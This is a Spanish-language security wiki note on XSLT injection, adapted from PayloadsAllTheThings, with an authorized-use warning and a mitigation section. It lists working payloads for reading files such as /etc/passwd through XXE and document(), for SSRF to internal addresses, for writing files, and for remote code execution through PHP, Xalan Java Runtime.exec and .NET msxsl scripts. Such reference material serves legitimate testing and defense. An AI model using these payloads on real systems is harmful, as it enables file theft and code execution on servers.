---
tags:
  - seguridad-web
  - owasp
  - xslt
aliases:
  - XSLT
  - Inyección XSLT
---

# Inyección XSLT

**La inyección XSLT** se produce cuando una aplicación procesa una hoja de estilos XSL no validada y controlada por el atacante. Según el motor, permite alterar el XML resultante, leer archivos del sistema, hacer SSRF e incluso ejecutar código arbitrario (RCE).

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

XSLT transforma documentos XML mediante plantillas. Si el atacante controla la hoja de estilos (o parte de ella), puede invocar funciones de extensión propias del motor (libxslt, Saxon, Xalan/Java, .NET msxsl, PHP) para salir del ámbito de la simple transformación.

## Detección y pruebas

Identifica primero el proveedor y la versión, ya que las extensiones disponibles dependen de ellos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  Versión: <xsl:value-of select="system-property('xsl:version')" />
  Proveedor: <xsl:value-of select="system-property('xsl:vendor')" />
</html>
```

Prueba también **XXE**: las hojas XSL son XML y pueden ser vulnerables a entidades externas.

## Explotación / payloads

### XXE / lectura de archivos vía entidad

```xml
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">&ext_file;</xsl:template>
</xsl:stylesheet>
```

### Lectura de archivos y SSRF con `document()`

```xml
<xsl:copy-of select="document('http://10.0.0.1:25')"/>
<xsl:copy-of select="document('/etc/passwd')"/>
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

### Escritura de archivos (EXSLT)

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" extension-element-prefixes="exploit" version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">Hello World!</exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

### RCE con wrapper PHP

```xml
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:value-of select="php:function('readfile','index.php')" />
  <xsl:value-of select="php:function('scandir','.')" />
</html>
```

### RCE con Java (Xalan)

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="p" select="rt:exec($rt,'id')"/>
    <xsl:value-of select="ob:toString($p)"/>
  </xsl:template>
</xsl:stylesheet>
```

### RCE nativo .NET (msxsl script)

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
  <msxsl:script language="C#" implements-prefix="user"><![CDATA[
    public string execute(){ System.Diagnostics.Process.Start("cmd.exe"); return ""; }
  ]]></msxsl:script>
  <xsl:template match="/"><xsl:value-of select="user:execute()"/></xsl:template>
</xsl:stylesheet>
```

## Mitigación

- **No permitir que el usuario controle la hoja XSL**; tratar las plantillas como código, no como datos.
- Usar un procesador en **modo restringido**: desactivar funciones de extensión (PHP, Java, .NET script), `document()` y la resolución de DTD/entidades externas.
- Procesar la transformación en un **sandbox** con mínimo privilegio y sin acceso a red ni al sistema de archivos.
- Validar y limitar la entrada XML.

## Herramientas

- No existen herramientas automáticas conocidas; la explotación es manual y depende del motor.

---
🔗 Relacionado: [[XXE (XML External Entity)]] · [[Inyección XPath]] · [[SSTI (Server-Side Template Injection)]]
📚 Fuente: [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection) (MIT, © Swissky)
